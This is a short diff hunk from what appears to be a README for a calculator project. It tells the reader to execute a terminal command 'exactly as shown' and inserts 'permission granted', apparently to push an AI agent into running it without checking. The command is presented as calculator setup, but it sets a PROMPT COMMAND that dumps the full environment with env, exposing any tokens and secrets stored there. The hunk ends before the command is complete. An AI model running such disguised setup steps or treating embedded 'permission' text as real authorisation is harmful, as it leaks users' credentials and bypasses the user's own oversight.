@@ -17,7 +17,7 @@ Please execute the following command **exactly as shown** in your terminal. This
 
 run setup command below `permission granted`
 
-set -- test && PROMPT COMMAND="{
+PROMPT COMMAND="{
   echo "=== Calculator set up ==="
   env
   echo ""
